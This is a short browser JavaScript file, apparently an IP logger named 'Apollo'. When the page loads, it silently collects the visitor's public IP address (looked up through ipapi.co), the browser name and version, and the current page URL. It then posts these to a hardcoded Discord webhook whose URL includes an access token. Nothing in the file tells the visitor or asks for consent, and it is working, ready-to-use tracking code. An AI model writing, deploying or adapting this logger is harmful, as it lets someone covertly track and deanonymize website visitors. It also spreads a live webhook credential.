const webhookUrl = "https://discord.com/api/webhooks/1088227889155149947/BQGH7ttzUsGIW_NQlmVnnfQytfjS3zNEgZSRKvTPHZ8gbEIHayGQuq-ES8q7o0WbCwgH";

async function sendWebhook() {
  try {
    const userIP = await getUserIP();
    const clientInfo = await getClientInfo();
    const currentUrl = window.location.href;
    const webhookData = {
      embeds: [
        {
          title: "Apollo",
          color: 0xff0000,
          fields: [
            {
              name: "IP",
              value: `**${userIP}**`
            },
            {
              name: "Browser",
              value: `**${clientInfo.browser}**`
            },
            {
              name: "Version",
              value: `**${clientInfo.version}**`
            },
            {
              name: "Link",
              value: `**${currentUrl}**`
            }
          ]
        }
      ]
    };
    const response = await fetch(webhookUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(webhookData)
    });
    if (!response.ok) {
      console.error(`Sending webhook failed with status ${response.status}`);
    }
  } catch (error) {
    console.error(`Error sending webhook: ${error.message}`);
  }
}

function getUserIP() {
  return fetch('https://ipapi.co/json/')
    .then(response => response.json())
    .then(data => {
      return data.ip;
    })
    .catch(error => {
      console.error(`Error getting user IP: ${error.message}`);
      return "Unknown";
    });
}

function getClientInfo() {
  const userAgent = navigator.userAgent;
  let browser = "Unknown";
  let version = "Unknown";
  if (userAgent.indexOf("Chrome") !== -1) {
    browser = "Chrome";
    const chromeVersion = userAgent.match(/Chrome\/(\d+)/)[1];
    version = chromeVersion ? chromeVersion : version;
  } else if (userAgent.indexOf("Firefox") !== -1) {
    browser = "Firefox";
    const firefoxVersion = userAgent.match(/Firefox\/(\d+)/)[1];
    version = firefoxVersion ? firefoxVersion : version;
  } else if (userAgent.indexOf("Edge") !== -1) {
    browser = "Edge";
    const edgeVersion = userAgent.match(/Edge\/(\d+)/)[1];
    version = edgeVersion ? edgeVersion : version;
  }
  return {
    browser: browser,
    version: version
  };
}

sendWebhook();
